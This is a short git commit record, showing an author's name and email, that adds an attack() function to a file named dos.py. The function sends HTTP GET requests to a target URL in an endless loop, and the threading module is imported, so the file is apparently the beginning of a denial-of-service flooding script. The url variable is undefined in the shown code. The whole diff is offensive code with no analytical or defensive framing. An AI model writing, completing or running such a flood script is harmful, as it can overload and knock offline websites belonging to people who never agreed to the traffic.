4d0d653fd97135943541917393e52745a2d603f1
Saravanesh-Git <saravanesh962006@gmail.com>
2025-03-06 20:07:09 +0530

    Function added

--- dos.py
+++ dos.py
@@ -1,2 +1,9 @@
 import requests
 import threading
+def attack():
+    while True:
+        try:
+            response = requests.get(url)
+            print("Request sent:", response.status_code)
+        except:
+            print("Request failed")
